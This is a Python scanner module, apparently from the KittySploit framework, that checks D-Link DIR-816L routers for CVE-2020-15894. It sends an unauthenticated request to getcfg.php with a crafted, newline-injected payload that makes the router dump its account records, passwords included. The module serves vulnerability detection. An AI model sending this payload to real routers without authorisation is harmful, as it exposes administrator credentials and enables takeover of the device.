#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DIR-816L getcfg.php account disclosure (CVE-2020-15894)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DIR-816L - getcfg.php Account Disclosure (CVE-2020-15894)',
        'description': (
            'Detects CVE-2020-15894 by requesting getcfg.php with a crafted SERVICES payload '
            'that dumps DEVICE.ACCOUNT including password fields.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2020', 'dlink', 'router', 'info-disclosure',
            'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2020-15894'],
        'cve': 'CVE-2020-15894',
    }

    def run(self):
        path = (
            '/getcfg.php?a=%0A_POST_SERVICES%3DDEVICE.ACCOUNT%0AAUTHORIZED_GROUP%3D1'
        )
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ''
        if re.search(r'<password>[^<]+</password>', body) and 'DEVICE.ACCOUNT' in body:
            self.set_info(
                severity='high',
                reason='D-Link DIR-816L getcfg.php account disclosure (CVE-2020-15894)',
                path='/getcfg.php',
            )
            return True
        return False
